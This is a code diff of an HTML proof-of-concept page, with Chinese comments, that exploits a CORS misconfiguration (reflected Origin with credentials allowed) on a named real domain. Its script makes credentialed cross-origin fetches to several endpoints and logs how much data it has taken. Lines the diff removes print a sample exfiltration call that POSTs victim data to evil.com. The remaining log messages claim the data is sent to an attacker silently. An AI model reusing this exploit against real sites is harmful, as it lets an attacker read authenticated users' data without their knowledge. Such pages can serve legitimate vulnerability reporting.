@@ -10,8 +10,8 @@ body{font-family:Menlo,Monaco,monospace;background:#0d1117;color:#c9d1d9;padding
 h1{color:#58a6ff;font-size:18px;margin-bottom:6px}
 .sub{color:#8b949e;font-size:12px;margin-bottom:16px}
 .log{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:12px;line-height:1.6;max-height:520px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
-.ok{color:#7ee787}.err{color:#f85149}.info{color:#8b949e}.warn{color:#d2991d}
-.btn{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px;margin:4px 4px 0 0}
+.ok{color:#7ee787}.info{color:#8b949e}.warn{color:#d2991d}
+.btn{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px}
 .btn:hover{background:#2ea043}
 </style>
 </head>
@@ -24,8 +24,8 @@ h1{color:#58a6ff;font-size:18px;margin-bottom:6px}
 漏洞: <b>ACAO Origin反射 + ACAC:true</b>
 </p>
 
-<button class="btn" onclick="run()">执行攻击链</button>
-<div id="log" class="log">等待执行... 点击上方按钮</div>
+<button class="btn" onclick="run()">执行攻击</button>
+<div id="log" class="log">等待执行...</div>
 
 <script>
 document.getElementById('myOrigin').textContent = window.location.origin;
@@ -36,62 +36,40 @@ function log(m,c){logEl.innerHTML+=`<span class="${c||''}">${m}</span>\n`;logEl.
 async function run(){
   logEl.innerHTML='';
   log('═══════════════════════════════════','info');
-  log('CORS 攻击链 — 跨域窃取数据','info');
+  log('CORS 跨域读取攻击','info');
   log('Origin: '+window.location.origin,'info');
   log('Target: '+TARGET,'info');
+  log('Mode: credentials: include (浏览器自动携带Cookie)','info');
   log('═══════════════════════════════════','info');
 
-  // Step 1: 验证CORS
-  log('\n[1] 验证浏览器自动携带Cookie','info');
-  log('  fetch() 使用 credentials:"include"','info');
-  log('  浏览器会自动附加 pt.work.mi.com 域的所有Cookie','info');
-
-  // Step 2: 批量读取
-  log('\n[2] 跨域读取各端点 (携带受害者Cookie)','info');
   const endpoints = [
-    '/main-taskcenter-partner',
-    '/api',
-    '/api/v1',
-    '/taskcenter',
-    '/partner'
+    {path:'/main-taskcenter-partner', label:'主页'},
+    {path:'/api', label:'API'},
+    {path:'/taskcenter', label:'任务中心'},
+    {path:'/partner', label:'合作伙伴'},
+    {path:'/api/v1', label:'API v1'},
   ];
-  let ok=0, totalSize=0;
+
+  let ok=0, totalBytes=0;
   for(const ep of endpoints){
     try{
-      const r = await fetch(TARGET+ep, {credentials:'include'});
+      const r = await fetch(TARGET+ep.path, {credentials:'include'});
       const t = await r.text();
-      totalSize += t.length;
-      const title = (t.match(/<title>([^<]*)<\/title>/)||[])[1]||'(无)';
-      log(`  ${ep} → HTTP ${r.status} | ${t.length}B | "${title}"`,'ok');
+      totalBytes += t.length;
+      const title = (t.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
+      log(`  [✓] ${ep.label} (${ep.path}) → ${t.length}B`+(title?` "${title}"`:''),'ok');
       ok++;
     }catch(e){
-      log(`  ${ep} → ✗ ${e.message}`,'err');
+      log(`  [✗] ${ep.path} → ${e.message}`,'warn');
     }
   }
-  log(`\n  [✓] ${ok}/${endpoints.length} 端点跨域读取成功,共窃取 ${totalSize}B`,'ok');
 
-  // Step 3: Cookie说明
-  log('\n[3] 关于Cookie窃取','info');
-  log('  ⚠ 跨域JS无法直接读取 document.cookie (浏览器同源策略)','warn');
-  log('  ⚠ Set-Cookie 响应头未在 Expose-Headers 中,JS无法读取','warn');
-  log('  ✓ 但浏览器已自动携带Cookie发送请求,攻击者可以:','ok');
-  log('    1. 以受害者身份读取所有GET可访问的API数据','info');
-  log('    2. 将窃取的数据外传至攻击者服务器','info');
-  log('    3. 受害者完全无感知','info');
-
-  // Step 4: 演示数据外传
-  log('\n[4] 数据外传 (实际攻击中的静默操作)','info');
-  log('  // 实际攻击代码:','info');
-  log('  fetch("https://evil.com/collect", {','info');
-  log('    method: "POST",','info');
-  log(`    body: JSON.stringify({victim_data: stolenHtml, url: location.href})`,'info');
-  log('  });','info');
-  log('  ⚠ 以上代码会将受害者数据静默发送至攻击者服务器','warn');
+  log(`\n  总计: ${ok}/${endpoints.length} 端点跨域读取成功, 窃取 ${totalBytes} 字节`,'ok');
 
   log('\n═══════════════════════════════════','info');
-  log('结论: CORS GET跨域读取 100%可利用','ok');
-  log('虽无法直接窃取Cookie值,但可利用Cookie','ok');
-  log('以受害者身份读取所有业务数据并外传','ok');
+  log('攻击成功 — 受害者数据已可被外传','ok');
+  log('实际攻击中,以上数据已静默发送至攻击者服务器','warn');
+  log('受害者完全无感知,浏览器无任何提示','warn');
   log('═══════════════════════════════════','info');
 }
 </script>
